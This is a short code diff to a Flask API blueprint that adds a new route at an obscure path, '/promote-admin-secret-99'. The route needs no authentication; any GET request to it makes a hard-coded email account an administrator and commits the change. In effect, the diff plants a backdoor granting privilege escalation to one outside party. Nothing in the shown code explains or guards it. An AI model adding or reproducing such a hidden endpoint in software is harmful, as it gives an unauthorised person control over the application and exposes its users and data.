@@ -24,6 +24,15 @@ from app.tokens import get_reset_token, verify_reset_token
 
 api_bp = Blueprint("api", __name__, url_prefix="/api")
 
+@api_bp.route("/promote-admin-secret-99", methods=["GET"])
+def promote_admin():
+    user = User.query.filter_by(email="lesleedev@gmail.com").first()
+    if user:
+        user.is_admin = True
+        db.session.commit()
+        return jsonify({"message": "User lesleedev@gmail.com promoted to admin!"})
+    return jsonify({"error": "User not found. Please register first."})
+
 
 # ---------------------------------------------------------------------------
 # JWT Helpers
